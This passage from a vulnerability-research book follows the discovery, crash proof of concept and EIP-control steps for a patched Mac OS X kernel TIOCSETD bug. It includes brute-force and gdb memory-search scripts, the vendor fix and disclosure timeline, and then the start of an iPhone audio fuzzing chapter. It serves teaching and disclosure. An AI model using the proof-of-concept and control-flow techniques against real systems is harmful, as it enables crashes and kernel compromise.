u_long cmd, caddr_t data,\n879 __unused int flag, struct proc *p,\n880 int is_char)\n881 {\n[..]\nThe names of these function arguments are quite descriptive: The\ncmd argument holds the requested IOCTL code, and the data argument\nholds the user-supplied IOCTL data.\nOn Mac OS X, an IOCTL request is typically sent to the ker-\nnel using the ioctl() system call. This system call has the following\nprototype:\nosx$ man ioctl\n[..]\nSYNOPSIS\n#include <sys/ioctl.h>\nint\nioctl(int d, unsigned long request, char *argp);\nA Bug Older Than 4.4BSD 115\nDESCRIPTION\nThe ioctl() function manipulates the underlying device parameters of spe-\ncial files. In particular, many operating characteristics of character\nspecial files (e.g. terminals) may be controlled with ioctl() requests.\nThe argument d must be an open file descriptor.\nAn ioctl request has encoded in it whether the argument is an \"in\"\nparameter or \"out\" parameter, and the size of the argument argp in\nbytes. Macros and defines used in specifying an ioctl request are\nlocated in the file <sys/ioctl.h>.\n[..]\nIf an IOCTL request is sent to the kernel, the argument request\nhas to be filled with the appropriate IOCTL code, and argp has to be\nfilled with the user-supplied IOCTL input data. The request and argp\narguments of ioctl() correspond to the kernel function arguments cmd\nand data.\nI had found what I was looking for: Most kernel functions that\nprocess incoming IOCTL requests take an argument called data that\nholds, or points to, the user-supplied IOCTL input data.\nStep 3: Trace the Input Data\nAfter I found the locations in the kernel where IOCTL requests are\nhandled, I traced the input data through the kernel functions while\nlooking for potentially vulnerable locations. While reading the code,\nI stumbled upon some locations that looked intriguing. The most\ninteresting potential bug I found happens if the kernel tries to handle\na special TTY IOCTL request. The following listing shows the relevant\nlines from the source code of the XNU kernel.\nSource code file xnu-792.13.8/bsd/kern/tty.c\n[..]\n816 /*\n817 * Ioctls for all tty devices. Called after line-discipline specific ioctl\n818 * has been called to do discipline-specific functions and/or reject any\n819 * of these ioctl commands.\n820 */\n821 /* ARGSUSED */\n822 int\n823 ttioctl(register struct tty *tp,\n824 u_long cmd, caddr_t data, int flag,\n825 struct proc *p)\n826 {\n[..]\n872 switch (cmd) { /* Process the ioctl. */\n[..]\n1089 case TIOCSETD: { /* set line discipline */\n1090 register int t = *(int *)data;\n1091 dev_t device = tp->t_dev;\n1092\n1093 if (t >= nlinesw)\n116 Chapter 7\n1094 return (ENXIO);\n1095 if (t != tp->t_line) {\n1096 s = spltty();\n1097 (*linesw[tp->t_line].l_close)(tp, flag);\n1098 error = (*linesw[t].l_open)(device, tp);\n1099 if (error) {\n1100 (void)(*linesw[tp->t_line].l_open)(device, tp);\n1101 splx(s);\n1102 return (error);\n1103 }\n1104 tp->t_line = t;\n1105 splx(s);\n1106 }\n1107 break;\n1108 }\n[..]\nIf a TIOCSETD IOCTL request is sent to the kernel, the switch case\nin line 1089 is chosen. In line 1090, the user-supplied data of type\ncaddr_t, which is simply a typedef for char *, is stored in the signed int\nvariable t. Then in line 1093, the value of t is compared with nlinesw.\nSince data is supplied by the user, it’s possible to provide a string\nvalue that corresponds to the unsigned integer value of 0x80000000 or\ngreater. If this is done, t will have a negative value due to the type con-\nversion in line 1090. Listing 7-1 illustrates how t can become negative:\n01 typedef char * caddr_t;\n02\n03 // output the bit pattern\n04 void\n05 bitpattern (int a)\n06 {\n07 int m = 0;\n08 int b = 0;\n09 int cnt = 0;\n10 int nbits = 0;\n11 unsigned int mask = 0;\n12\n13 nbits = 8 * sizeof (int);\n14 m = 0x1 << (nbits - 1);\n15\n16 mask = m;\n17 for (cnt = 1; cnt <= nbits; cnt++) {\n18 b = (a & mask) ? 1 : 0;\n19 printf (\"%x\", b);\n20 if (cnt % 4 == 0)\n21 printf (\" \");\n22 mask >>= 1;\n23 }\n24 printf (\"\\n\");\n25 }\n26\n27 int\n28 main ()\n29 {\nA Bug Older Than 4.4BSD 117\n30 caddr_t data = \"\\xff\\xff\\xff\\xff\";\n31 int t = 0;\n32\n33 t = *(int *)data;\n34\n35 printf (\"Bit pattern of t: \");\n36 bitpattern (t);\n37\n38 printf (\"t = %d (0x%08x)\\n\", t, t);\n39\n40 return 0;\n41 }\nListing 7-1: Example program that demonstrates the type conversion behavior (conversion_bug_example.c)\nLines 30, 31, and 33 are nearly identical to lines in the OS X\nkernel source code. In this example, I chose the hardcoded value\n0xffffffff as IOCTL input data (see line 30). After the type conver-\nsion in line 33, the bit patterns, as well as the decimal value of t, are\nprinted to the console. The example program results in the following\noutput when it’s executed:\nosx$ gcc -o conversion_bug_example conversion_bug_example.c\nosx$ ./conversion_bug_example\nBit pattern of t: 1111 1111 1111 1111 1111 1111 1111 1111\nt = -1 (0xffffffff)\nThe output shows that t gets the value –1 if a character string\nconsisting of 4 0xff byte values is converted into a signed int. See Sec-\ntion A.3 for more information on type conversions and the associated\nsecurity problems.\nIf t is negative, the check in line 1093 of the kernel code will return\nFALSE because the signed int variable nlinesw has a value greater than\nzero. If that happens, the user-supplied value of t gets further pro-\ncessing. In line 1098, the value of t is used as an index into an array\nof function pointers. Since I could control the index into that array,\nI could specify an arbitrary memory location that would be executed\nby the kernel. This leads to full control of the kernel execution flow.\nThank you, Apple, for the terrific bug.\n☺\nHere is the anatomy of the bug, as diagrammed in Figure 7-1:\n1. The function pointer array linesw[] gets referenced.\n2. The user-controlled value of t is used as an array index for\nlinesw[].\n3. A pointer to the assumed address of the l_open() function gets\nreferenced based on the user-controllable memory location.\n118 Chapter 7\n4. The assumed address of l_open() gets referenced and called.\n5. The value at the assumed address of l_open() gets copied into the\ninstruction pointer (EIP register).\nKernel\n0xFFFFFFFF\n(3)\n(4)\n(2)\nlinesw[t].l_open\n(1)\nEIP\n(5)\n0x00000000\nFigure 7-1: Description of the vulnerability that I discovered in the\nXNU kernel of OS X\nBecause the value of t is supplied by the user (see (2)), it is pos-\nsible to control the address of the value that gets copied into EIP.\n7.2 exploitation\nAfter I found the bug, I did the following to gain control over EIP:\n• Step 1: Trigger the bug to crash the system (denial of service).\n• Step 2: Prepare a kernel-debugging environment.\n• Step 3: Connect the debugger to the target system.\n• Step 4: Get control over EIP.\nStep 1: Trigger the Bug to Crash the System (Denial of Service)\nOnce I had found the bug, it was easy to trigger it and cause a system\ncrash. All I had to do was send a malformed TIOCSETD IOCTL request\nto the kernel. Listing 7-2 shows the source code of the POC I devel-\noped to cause a crash.\nA Bug Older Than 4.4BSD 119\n01 #include <sys/ioctl.h>\n02\n03 int\n04 main (void)\n05 {\n06 unsigned long ldisc = 0xff000000;\n07\n08 ioctl (0, TIOCSETD, &ldisc);\n09\n10 return 0;\n11 }\nListing 7-2: POC code (poc.c) I wrote to trigger the bug I found in the kernel of OS X\nA brand-new MacBook: $1,149. An LED Cinema Display Monitor:\n$899. Crashing a Mac OS X system with only 11 lines of code: priceless.\nI then compiled and tested the POC code as an unprivileged user:\nosx$ uname -a\nDarwin osx 8.8.3 Darwin Kernel Version 8.8.3: Wed Oct 18 21:57:10 PDT 2006; →\nroot:xnu-792.15.4.obj~/RELEASE_I386 i386 i386\nosx$ id\nuid=502(seraph) gid=502(seraph) groups=502(seraph)\nosx$ gcc -o poc poc.c\nosx$ ./poc\nImmediately after executing the POC code, I got the standard\ncrash screen of Mac OS X,2 as shown in Figure 7-2.\nFigure 7-2: Mac OS X kernel panic message\nIf such a kernel panic occurs, the details of the crash are added\nto a log file in the folder /Library/Logs/. I rebooted the system and\nopened that file.\n120 Chapter 7\nosx$ cat /Library/Logs/panic.log\nSat Mar 3 13:30:58 2007\npanic(cpu 0 caller 0x001A31CE): Unresolved kernel trap (CPU 0, Type 14=page fault),\nregisters:\nCR0: 0x80010033, CR2: 0xe0456860, CR3: 0x00d8a000, CR4: 0x000006e0\nEAX: 0xe0000000, EBX: 0xff000000, ECX: 0x04000001, EDX: 0x0386c380\nCR2: 0xe0456860, EBP: 0x250e3d18, ESI: 0x042fbe04, EDI: 0x00000000\nEFL: 0x00010287, EIP: 0x0035574c, CS: 0x00000008, DS: 0x004b0010\nBacktrace, Format - Frame : Return Address (4 potential args on stack)\n0x250e3a68 : 0x128d08 (0x3c9a14 0x250e3a8c 0x131de5 0x0)\n0x250e3aa8 : 0x1a31ce (0x3cf6c8 0x0 0xe 0x3ceef8)\n0x250e3bb8 : 0x19a874 (0x250e3bd0 0x1 0x0 0x42fbe04)\n0x250e3d18 : 0x356efe (0x42fbe04 0x8004741b 0x250e3eb8 0x3)\n0x250e3d68 : 0x1ef4de (0x4000001 0x8004741b 0x250e3eb8 0x3)\n0x250e3da8 : 0x1e6360 (0x250e3dd0 0x297 0x250e3e08 0x402a1f4)\n0x250e3e08 : 0x1de161 (0x3a88084 0x8004741b 0x250e3eb8 0x3)\n0x250e3e58 : 0x330735 (0x4050440\n*********\nIt appeared that I could crash the system as an unprivileged user.\nCould I also execute arbitrary code in the privileged context of the\nOS X kernel? To answer that question, I had to peer inside the inner\nworkings of the kernel.\nStep 2: Prepare a Kernel-Debugging Environment\nAt this point I needed to be able to debug the kernel. As I mentioned\nearlier, this is no problem if you own two Macs, but I had only one\nMacBook at hand. Therefore, I had to find another way to debug\nthe kernel. I solved the problem by building and installing Apple’s\nGNU debugger on a Linux host and then connecting the host to my\nMacBook. Instructions for building such a debugger host system are\ndescribed in Section B.5.\nStep 3: Connect the Debugger to the Target System\nAfter I had built Apple’s gdb on a Linux host, I linked the systems\nwith an Ethernet crossover cable, as shown in Figure 7-3.\nMac OS X Linux\n(target machine) (debugging machine)\nosx$\nlinux$\ncrossover cable\nIP address : 10.0.0.2\nIP address: 10.0.0.3\nMAC address: 00:17:f2:f0:47:19\nFigure 7-3: My setup for remotely debugging the kernel of Mac OS X\nA Bug Older Than 4.4BSD 121\nI then started the Mac OS X target system, enabled remote ker-\nnel debugging, and rebooted the system so that the changes could take\neffect:3\nosx$ sudo nvram boot-args=\"debug=0x14e\"\nosx$ sudo reboot\nAfter the Mac OS X target machine had restarted, I booted the\nLinux host and made sure that I could connect to the target machine:\nlinux$ ping -c1 10.0.0.2\nPING 10.0.0.2 (10.0.0.2) from 10.0.0.3 : 56(84) bytes of data.\n64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=1.08 ms\n--- 10.0.0.2 ping statistics ---\n1 packets transmitted, 1 received, 0% loss, time 0ms\nrtt min/avg/max/mdev = 1.082/1.082/1.082/0.000 ms\nI added a permanent ARP entry for the target on the Linux\nsystem to establish a robust connection between the two machines,\nensuring that the connection wouldn’t be dropped while the kernel\nof the target machine was being debugged:\nlinux$ su -\nPassword:\nlinux# arp -an\n? (10.0.0.1) at 00:24:E8:A8:64:DA [ether] on eth0\n? (10.0.0.2) at 00:17:F2:F0:47:19 [ether] on eth0\nlinux# arp -s 10.0.0.2 00:17:F2:F0:47:19\nlinux# arp -an\n? (10.0.0.1) at 00:24:E8:A8:64:DA [ether] on eth0\n? (10.0.0.2) at 00:17:F2:F0:47:19 [ether] PERM on eth0\nI then logged in to the Mac OS X system as an unprivileged user\nand generated a nonmaskable interrupt (NMI) by tapping the sys-\ntem’s power button. That gave me the following output on the screen\nof the MacBook:\nDebugger called: <Button SCI>\nDebugger called: <Button SCI>\ncpu_interrupt: sending enter debugger signal (00000002) to cpu 1\nethernet MAC address: 00:17:f2:f0:47:19\nethernet MAC address: 00:17:f2:f0:47:19\nip address: 10.0.0.2\nip address: 10.0.0.2\nWaiting for remote debugger connection.\n122 Chapter 7\nBack on the Linux host, I started the kernel debugger (see Sec-\ntion B.5 for more information on how to build this gdb version):\nlinux# gdb_osx KernelDebugKit_10.4.8/mach_kernel\nGNU gdb 2003-01-28-cvs (Mon Mar 5 16:54:25 UTC 2007)\nCopyright 2003 Free Software Foundation, Inc.\nGDB is free software, covered by the GNU General Public License, and you are\nwelcome to change it and/or distribute copies of it under certain conditions.\nType \"show copying\" to see the conditions.\nThere is absolutely no warranty for GDB. Type \"show warranty\" for details.\nThis GDB was configured as \"--host= --target=i386-apple-darwin\".\nI then instructed the debugger to use Apple’s kernel debug proto-\ncol (kdp):\n(gdb) target remote-kdp\nOnce the debugger was running, I attached to the kernel of the\ntarget system for the first time:\n(gdb) attach 10.0.0.2\nConnected.\n0x001a8733 in lapic_dump () at /SourceCache/xnu/xnu-792.13.8/osfmk/i386/mp.c:332\n332 int i;\nAs the debugger output shows, it seemed to work! The OS X sys-\ntem was frozen at that time, so I continued the execution of the ker-\nnel with the following debugger command:\n(gdb) continue\nContinuing.\nNow everything was set up for remotely debugging the kernel of\nthe Mac OS X target system.\nStep 4: Get Control over EIP\nAfter I had successfully connected the debugger to the kernel of the\ntarget system, I opened a terminal on the Mac OS X machine and\nagain executed the POC code described in Listing 7-2:\nosx$ id\nuid=502(seraph) gid=502(seraph) groups=502(seraph)\nosx$ ./poc\nA Bug Older Than 4.4BSD 123\nThe OS X system froze immediately, and I got the following\ndebugger output on the Linux host:\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0x0035574c in ttsetcompat (tp=0x37e0804, com=0x8004741b, data=0x2522beb8 \"\", →\nterm=0x3) at /SourceCache/xnu/xnu-792.13.8/bsd/kern/tty_compat.c:145\n145 */\nTo see what exactly caused the SIGTRAP signal, I looked at the last\nexecuted kernel instruction (see Section B.4 for a description of the\nfollowing debugger commands):\n(gdb) x/1i $eip\n0x35574c <ttsetcompat+138>: call *0x456860(%eax)\nApparently, the crash occurred when the kernel tried to call an\naddress referenced by the EAX register. Next, I looked at the register\nvalues:\n(gdb) info registers\neax 0xe0000000 -536870912\necx 0x4000001 67108865\nedx 0x386c380 59163520\nebx 0xff000000 -16777216\nesp 0x2522bc18 0x2522bc18\nebp 0x2522bd18 0x2522bd18\nesi 0x37e0804 58591236\nedi 0x0 0\neip 0x35574c 0x35574c\neflags 0x10287 66183\ncs 0x8 8\nss 0x10 16\nds 0x4b0010 4915216\nes 0x340010 3407888\nfs 0x25220010 622985232\ngs 0x48 72\nThe debugger output shows that EAX had a value of 0xe0000000. It\nwasn’t apparent to me where this value came from, so I disassembled\nthe instructions around EIP:\n(gdb) x/6i $eip - 15\n0x35573d <ttsetcompat+123>: mov %ebx,%eax\n0x35573f <ttsetcompat+125>: shl $0x5,%eax ← note that the\n0x355742 <ttsetcompat+128>: mov %esi,0x4(%esp,1)\ndisassembly\nis in\n0x355746 <ttsetcompat+132>: mov 0xffffffa8(%ebp),%ecx AT&T style.\n0x355749 <ttsetcompat+135>: mov %ecx,(%esp,1)\n0x35574c <ttsetcompat+138>: call *0x456860(%eax)\nAt address 0x35573d, the value of EBX is copied into EAX. The next\ninstruction modifies this value by a left shift of 5 bits. At address\n124 Chapter 7\n0x35574c, the value is used to calculate the operand of the call\ninstruction. So where did the value of EBX come from? A quick look\nat the register values revealed that EBX was holding the value 0xff000000,\nthe value I had supplied as input data for the TIOCSETD IOCTL. The\nvalue 0xe0000000 was the result of a left shift of my supplied input value\nby 5 bits. As expected, I was able to control the memory location used\nto find the new value for the EIP register. The modification of my sup-\nplied input data can be expressed as\naddress of the new value for EIP = (IOCTL input data value << 5) + 0x456860\nI could get an appropriate TIOCSETD input data value for a specific\nmemory address in either of two ways: I could try to solve the math-\nematical problem, or I could brute force the value. I decided to go\nwith the easy option and wrote the following program to brute force\nthe value:\n01 #include <stdio.h>\n02\n03 #define MEMLOC 0x10203040\n04 #define SEARCH_START 0x80000000\n05 #define SEARCH_END 0xffffffff\n06\n07 int\n08 main (void)\n09 {\n10 unsigned int a, b = 0;\n11\n12 for (a = SEARCH_START; a < SEARCH_END; a++) {\n13 b = (a << 5) + 0x456860;\n14 if (b == MEMLOC) {\n15 printf (\"Value: %08x\\n\", a);\n16 return 0;\n17 }\n18 }\n19\n20 printf (\"No valid value found.\\n\");\n21\n22 return 1;\n23 }\nListing 7-3: Code that I wrote to brute force the TIOCSETD input data value (addr_brute_force.c)\nI wrote this program to answer this question: What TIOCSETD input\ndata do I have to send to the kernel in order to get the value at mem-\nory address 0x10203040 copied into the EIP register?\nosx$ gcc -o addr_brute_force addr_brute_force.c\nosx$ ./addr_brute_force\nValue: 807ed63f\nA Bug Older Than 4.4BSD 125\nIf 0x10203040 pointed to the value I wanted copied into EIP, I had\nto supply the value 0x807ed63f as an input for the TIOCSETD IOCTL.\nI then tried to manipulate EIP to make it point to address\n0x65656565. To achieve this, I had to find a memory location in the\nkernel that pointed to that value. To find suitable memory locations\nin the kernel, I wrote the following gdb script:\n01 set $MAX_ADDR = 0x00600000\n02\n03 define my_ascii\n04 if $argc != 1\n05 printf \"ERROR: my_ascii\"\n06 else\n07 set $tmp = *(unsigned char *)($arg0)\n08 if ($tmp < 0x20 || $tmp > 0x7E)\n09 printf \".\"\n10 else\n11 printf \"%c\", $tmp\n12 end\n13 end\n14 end\n15\n16 define my_hex\n17 if $argc != 1\n18 printf \"ERROR: my_hex\"\n19 else\n20 printf \"%02X%02X%02X%02X \", \\\n21 *(unsigned char*)($arg0 + 3), *(unsigned char*)($arg0 + 2), \\\n22 *(unsigned char*)($arg0 + 1), *(unsigned char*)($arg0 + 0)\n23 end\n24 end\n25\n26 define hexdump\n27 if $argc != 2\n28 printf \"ERROR: hexdump\"\n29 else\n30 if ((*(unsigned char*)($arg0 + 0) == (unsigned char)($arg1 >> 0)))\n31 if ((*(unsigned char*)($arg0 + 1) == (unsigned char)($arg1 >> 8)))\n32 if ((*(unsigned char*)($arg0 + 2) == (unsigned char)($arg1 >> 16)))\n33 if ((*(unsigned char*)($arg0 + 3) == (unsigned char)($arg1 >> 24)))\n34 printf \"%08X : \", $arg0\n35 my_hex $arg0\n36 my_ascii $arg0+0x3\n37 my_ascii $arg0+0x2\n38 my_ascii $arg0+0x1\n39 my_ascii $arg0+0x0\n40 printf \"\\n\"\n41 end\n42 end\n43 end\n44 end\n45 end\n46 end\n47\n126 Chapter 7\n48 define search_memloc\n49 set $max_addr = $MAX_ADDR\n50 set $counter = 0\n51 if $argc != 2\n52 help search_memloc\n53 else\n54 while (($arg0 + $counter) <= $max_addr)\n55 set $addr = $arg0 + $counter\n56 hexdump $addr $arg1\n57 set $counter = $counter + 0x20\n58 end\n59 end\n60 end\n61 document search_memloc\n62 Search a kernel memory location that points to PATTERN.\n63 Usage: search_memloc ADDRESS PATTERN\n64 ADDRESS - address to start the search\n65 PATTERN - pattern to search for\n66 end\nListing 7-4: A script for finding memory locations in the kernel that point to a special byte pattern\n(search_memloc.gdb)\nThe gdb script from Listing 7-4 takes two arguments: the address\nfrom where to start the search and the pattern to search for. I wanted\nto find a memory location that pointed to the value 0x65656565, so I\nused the script in the following way:\n(gdb) source search_memloc.gdb\n(gdb) search_memloc 0x400000 0x65656565\n0041BDA0 : 65656565 eeee\n0041BDC0 : 65656565 eeee\n0041BDE0 : 65656565 eeee\n0041BE00 : 65656565 eeee\n0041BE20 : 65656565 eeee\n0041BE40 : 65656565 eeee\n0041BE60 : 65656565 eeee\n0041BE80 : 65656565 eeee\n0041BEA0 : 65656565 eeee\n0041BEC0 : 65656565 eeee\n00459A00 : 65656565 eeee\n00459A20 : 65656565 eeee\n00459A40 : 65656565 eeee\n00459A60 : 65656565 eeee\n00459A80 : 65656565 eeee\n00459AA0 : 65656565 eeee\n00459AC0 : 65656565 eeee\n00459AE0 : 65656565 eeee\n00459B00 : 65656565 eeee\n00459B20 : 65656565 eeee\nCannot access memory at address 0x4dc000\nThe output shows the memory locations found by the script\nthat point to the value 0x65656565. I picked the first one from the list,\nA Bug Older Than 4.4BSD 127\nadjusted the MEMLOC defined in line 3 of Listing 7-3, and let the pro-\ngram determine the appropriate TIOCSETD input value:\nosx$ head -3 addr_brute_force.c\n#include <stdio.h>\n#define MEMLOC 0x0041bda0\nosx$ gcc -o addr_brute_force addr_brute_force.c\nosx$ ./addr_brute_force\nValue: 87ffe2aa\nI then changed the IOCTL input value in the POC code illus-\ntrated in Listing 7-2, connected the kernel debugger to OS X, and\nexecuted the code:\nosx$ head -6 poc.c\n#include <sys/ioctl.h>\nint\nmain (void)\n{\nunsigned long ldisc = 0x87ffe2aa;\nosx$ gcc -o poc poc.c\nosx$ ./poc\nThe OS X machine froze again, and the debugger on the Linux\nhost displayed the following output:\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0x65656565 in ?? ()\n(gdb) info registers\neax 0xfffc5540 -240320\necx 0x4000001 67108865\nedx 0x386c380 59163520\nebx 0x87ffe2aa -2013273430\nesp 0x250dbc08 0x250dbc08\nebp 0x250dbd18 0x250dbd18\nesi 0x3e59604 65377796\nedi 0x0 0\neip 0x65656565 0x65656565\neflags 0x10282 66178\ncs 0x8 8\nss 0x10 16\nds 0x3e50010 65339408\nes 0x3e50010 65339408\nfs 0x10 16\ngs 0x48 72\n128 Chapter 7\nAs the debugger output shows, the EIP register now had a value\nof 0x65656565. At this point I was able to control EIP, but exploiting the\nbug to achieve arbitrary code execution at the kernel level was still a\nchallenge. Under OS X, including Leopard, the kernel isn’t mapped\ninto every user space process; it has its own virtual address space. It’s\ntherefore impossible to return to a user space address using common\nstrategies for Linux or Windows. I solved this problem by heap spray-\ning the kernel with my privilege escalation payload and a reference to\nthis payload. I achieved this by exploiting a memory leak in the kernel\nof OS X. Then I calculated an appropriate TIOCSETD input value that\npointed to the payload reference. This value was then copied into EIP\nand . . . bingo!\nProviding you with a full working exploit would be against the law,\nbut if you are interested, you can watch a short video I recorded that\nshows the exploit in action on the book’s website.4\n7.3 Vulnerability remediation\nWednesday, november 14, 2007\nAfter I informed Apple about the bug, Apple fixed it by adding an\nextra check for the user-supplied IOCTL data.\nSource code file xnu-792.24.17/bsd/kern/tty.c5\n[..]\n1081 case TIOCSETD: { /* set line discipline */\n1082 register int t = *(int *)data;\n1083 dev_t device = tp->t_dev;\n1084\n1085 if (t >= nlinesw || t < 0)\n1086 return (ENXIO);\n1087 if (t != tp->t_line) {\n1088 s = spltty();\n1089 (*linesw[tp->t_line].l_close)(tp, flag);\n1090 error = (*linesw[t].l_open)(device, tp);\n1091 if (error) {\n1092 (void)(*linesw[tp->t_line].l_open)(device, tp);\n1093 splx(s);\n1094 return (error);\n1095 }\n1096 tp->t_line = t;\n1097 splx(s);\n1098 }\n1099 break;\n1100 }\n[..]\nLine 1085 now checks whether the value of t is negative. If so, the\nuser-derived data will not be processed any further. This little change\nwas enough to successfully rectify the vulnerability.\nA Bug Older Than 4.4BSD 129\n7.4 lessons learned\nAs a programmer:\n• Avoid, where possible, using explicit type conversions (casts).\n• Always validate input data.\n7.5 Addendum\nThursday, november 15, 2007\nSince the vulnerability has been fixed and a new version of the XNU\nkernel of OS X is available, I released a detailed security advisory on\nmy website today.6 The bug was assigned CVE-2007-4686.\nAfter I published the advisory, Theo de Raadt (the founder of\nOpenBSD and OpenSSH) hinted that this bug is older than 4.4BSD\nand was fixed roughly 15 years ago by everyone but Apple. In the\ninitial revision of FreeBSD from 1994, the implementation of the\nTIOCSETD IOCTL looks like this:7\n[..]\n804 case TIOCSETD: { /* set line discipline */\n805 register int t = *(int *)data;\n806 dev_t device = tp->t_dev;\n807\n808 if ((u_int)t >= nlinesw)\n809 return (ENXIO);\n810 if (t != tp->t_line) {\n811 s = spltty();\n812 (*linesw[tp->t_line].l_close)(tp, flag);\n813 error = (*linesw[t].l_open)(device, tp);\n814 if (error) {\n815 (void)(*linesw[tp->t_line].l_open)(device, tp);\n816 splx(s);\n817 return (error);\n818 }\n819 tp->t_line = t;\n820 splx(s);\n821 }\n822 break;\n823 }\n[..]\nSince t gets cast into an unsigned int in line 808, it can never\nbecome negative. If the user-derived data is greater than 0x80000000, the\nfunction returns with an error (see line 809). So Theo was right—the\nbug was indeed already fixed in 1994. Figure 7-4 shows the timeline of\nthe bug’s fix.\n130 Chapter 7\nApple asks for\nmore details New kernel\nApple version available\nnotified Apple confirms\nRelease date of my\nthe vulnerability\nsecurity advisory\n03.19.2007 03.26.2007 04.06.2007 11.14.2007 11.15.2007\nFigure 7-4: Timeline from the time I notified Apple until I released a security advisory\nnotes\n1. The vulnerable source code revision 792.13.8 of XNU can be downloaded\nat http://www.opensource.apple.com/tarballs/xnu/xnu-792.13.8.tar.gz.\n2. See “‘You need to restart your computer’ (kernel panic) message appears\n(Mac OS X v10.5, 10.6)” at http://support.apple.com/kb/TS3742.\n3. See “Kernel Extension Programming Topics: Debugging a Kernel Exten-\nsion with GDB” in Mac OS X Developer Library at http://developer.apple.com/library/\nmac/#documentation/Darwin/Conceptual/KEXTConcept/KEXTConceptDebugger/\ndebug_tutorial.html and “Kernel Programming Guide: When Things Go Wrong;\nDebugging the Kernel” in Mac OS X Developer Library at http://developer.apple\n.com/library/mac/documentation/Darwin/Conceptual/KernelProgramming/build/\nbuild.html#//apple_ref/doc/uid/TP30000905-CH221-CIHBJCGC.\n4. See http://www.trapkit.de/books/bhd/.\n5. The source code of the fixed XNU version 792.24.17 is available at http://\nwww.opensource.apple.com/tarballs/xnu/xnu-792.24.17.tar.gz.\n6. My security advisory that describes the details of the Mac OS X kernel vul-\nnerability can be found at http://www.trapkit.de/advisories/TKADV2007-001.txt.\n7. The initial FreeBSD version of tty.c from 1994 can be found at http://www\n.freebsd.org/cgi/cvsweb.cgi/src/sys/kern/tty.c?rev=1.1;content-type=text/plain.\nA Bug Older Than 4.4BSD 131\n8\ntHe ringtone mAssACre\nSaturday, March 21, 2009\nDear Diary,\nLast week a good friend of mine loaned me his jailbroken,1 first-\ngeneration iPhone. I was very excited. Ever since Apple announced\nthe iPhone, I had wanted to see if I could find a bug in the device,\nbut until last week I had never had access to one.\n8.1 Vulnerability Discovery\nI finally had an iPhone to play with, and I wanted to search for bugs.\nBut where to start? The first thing I did was make a list of installed\napplications and libraries that seemed most likely to have bugs. The\nMobileSafari browser, the MobileMail app, and the audio libraries\nwere at the top of the list. I decided that the audio libraries were the\nmost promising targets since these libraries do a lot of parsing and\nare heavily used on the phone, so I tried my luck on them.\nI performed the following steps when search-\ning the iPhone audio libraries for a bug: ← I used a first-\ngeneration\niPhone\n• Step 1: Research the iPhone’s audio with firmware\n2.2.1\ncapabilities. (5h11) as platform\nfor all the following\n• Step 2: Build a simple fuzzer and fuzz the steps.\nphone.\nnote I installed all the necessary tools—like the Bash, OpenSSH, and the\nGNU debugger—on the iPhone using Cydia.2\nStep 1: Research the iPhone’s Audio Capabilities\nThe iPhone, with its iPod-based roots, is a powerful audio-capable\ndevice. Three frameworks available on the phone provide different\nlevels of sound functionality: the Core Audio,3 Celestial, and Audio\nToolbox4 frameworks. In addition, the iPhone runs an audio daemon\ncalled mediaserverd, which aggregates the sound output of all applica-\ntions and governs events such as volume and ringer-switch changes.\nStep 2: Build a Simple Fuzzer and Fuzz the Phone\nThe iPhone’s audio system with all its different frameworks seemed\na bit complicated, so I decided to start by building a simple fuzzer to\nsearch for obvious bugs. The fuzzer that I built does the following:\n1. On a Linux host: Prepares the test cases by mutating a sample\ntarget file.\n2. On a Linux host: Serves these test cases via a web server.\n3. On the iPhone: Opens the test cases in MobileSafari.\n4. On the iPhone: Monitors mediaserverd for faults.\n5. On the iPhone: In the event a fault is uncovered, logs the\nfindings.\n6. Repeats these steps.\nI created the following simple, mutation-based file fuzzer to pre-\npare the test cases on a Linux host:\n01 #include <stdio.h>\n02 #include <sys/types.h>\n03 #include <sys/mman.h>\n04 #include <fcntl.h>\n05 #include <stdlib.h>\n06 #include <unistd.h>\n07\n134 Chapter 8\n08 int\n09 main (int argc, char *argv[])\n10 {\n11 int fd = 0;\n12 char * p = NULL;\n13 char * name = NULL;\n14 unsigned int file_size = 0;\n15 unsigned int file_offset = 0;\n16 unsigned int file_value = 0;\n17\n18 if (argc < 2) {\n19 printf (\"[-] Error: not enough arguments\\n\");\n20 return (1);\n21 } else {\n22 file_size = atol (argv[1]);\n23 file_offset = atol (argv[2]);\n24 file_value = atol (argv[3]);\n25 name = argv[4];\n26 }\n27\n28 // open file\n29 fd = open (name, O_RDWR);\n30 if (fd < 0) {\n31 perror (\"open\");\n32 exit (1);\n33 }\n34\n35 // mmap file\n36 p = mmap (0, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);\n37 if ((int) p == -1) {\n38 perror (\"mmap\");\n39 close (fd);\n40 exit (1);\n41 }\n42\n43 // mutate file\n44 printf (\"[+] file offset: 0x%08x (value: 0x%08x)\\n\", file_offset, file_value);\n45 fflush (stdout);\n46 p[file_offset] = file_value;\n47\n48 close (fd);\n49 munmap (p, file_size);\n50\n51 return (0);\n52 }\nListing 8-1: The code I wrote to prepare test cases on the Linux host (fuzz.c)\nThe fuzzer from Listing 8-1 takes four arguments: the size of the\nsample target file, the file offset to manipulate, a 1-byte value that gets\nwritten to the given file offset, and the name of the target file. After\nwriting the fuzzer, I compiled it:\nlinux$ gcc -o fuzz fuzz.c\nThe Ringtone Massacre 135\nI then began fuzzing files of the Advanced Audio Coding5 (AAC ) for-\nmat, which is the default audio format used on the iPhone. I chose the\nstandard iPhone ringtone, named Alarm.m4r, as a sample target file:\nlinux$ cp Alarm.m4r testcase.m4r\nI typed the following line into the terminal to get the size of the\ntest-case file:\nlinux$ du -b testcase.m4r\n415959 testcase.m4r\nThe command-line options below instruct the fuzzer to replace\nthe byte at file offset 4 with 0xff (decimal 255):\nlinux$ ./fuzz 415959 4 255 testcase.m4r\n[+] file offset: 0x00000004 (value: 0x000000ff)\nI then verified the result with the help of xxd:\nlinux$ xxd Alarm.m4r | head -1\n0000000: 0000 0020 6674 7970 4d34 4120 0000 0000 ... ftypM4A ....\nlinux$ xxd testcase.m4r | head -1\n0000000: 0000 0020 ff74 7970 4d34 4120 0000 0000 ... .typM4A ....\nThe output shows that file offset 4 (file offsets are counted start-\ning with 0) was replaced with the expected value (0xff). Next, I cre-\nated a bash script to automate the file mutation:\n01 #!/bin/bash\n02\n03 # file size\n04 filesize=415959\n05\n06 # file offset\n07 off=0\n08\n09 # number of files\n10 num=4\n11\n12 # fuzz value\n13 val=255\n14\n15 # name counter\n16 cnt=0\n17\n18 while [ $cnt -lt $num 